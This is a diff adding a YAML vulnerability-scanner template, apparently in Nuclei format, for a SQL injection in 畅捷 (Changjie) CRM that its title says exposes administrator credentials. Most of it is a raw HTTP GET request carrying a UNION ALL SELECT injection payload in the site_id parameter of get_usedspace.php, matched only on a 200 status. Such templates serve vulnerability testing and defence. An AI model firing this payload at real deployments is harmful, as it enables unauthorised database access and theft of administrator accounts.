@@ -1,0 +1,34 @@
+id: poc-go1dybtz207z1k1n
+info:
+  name: 畅捷CRM SQL注入漏洞获取管理员账号密码
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/go1dybtz207z1k1n'
+  tags: sqli,info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: go1dybtz207z1k1n
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)-- HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
